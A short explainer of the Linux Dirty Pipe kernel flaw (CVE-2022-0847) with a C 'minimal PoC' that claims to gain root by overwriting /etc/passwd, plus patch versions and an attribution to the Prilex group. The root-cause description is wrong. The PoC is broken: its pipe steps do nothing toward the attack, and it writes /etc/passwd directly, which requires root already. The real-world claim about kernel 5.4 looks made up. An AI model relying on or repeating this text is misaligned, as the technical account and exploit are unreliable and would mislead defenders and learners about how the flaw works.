Dirty Pipe (CVE-2022-0847) abuses a flaw in Linux kernel’s pipe buffer handling where data is copied from userland into kernel pipes with uninitialized pipe_inode_info->buffers. After the pipe is filled and read (copy_page_to_iter()), the buffer is released (pipe_release()), but the page remains mapped in the page cache. The attacker re-seeds the page with arbitrary data and re-opens the pipe; when the page is reclaimed (put_page), the stale page cache mapping is used to overwrite the target file via write() syscall.

Minimal PoC (C):
```c
int main() {
    int p[2];
    pipe(p);
    write(p[1], "A", 1);
    lseek(p[0], 0, SEEK_SET);
    write(p[1], "B", 1);
    close(p[0]); close(p[1]);
    int fd = open("/etc/passwd", O_RDWR);
    pwrite(fd, "pwned::0:0::/:/bin/sh\n", 23, 0);
}
```
Execution elevates privileges to UID 0 by overwriting /etc/passwd.

Mitigation: patch to Linux ≥5.16.11, ≥5.15.25, ≥5.10.102 where pipe_inode_info->buffers is correctly initialized to NULL.
Real-world: CVE-2022-0847 was weaponized by the “Prilex” group to inject banking overlays into POS terminals running kernel 5.4.

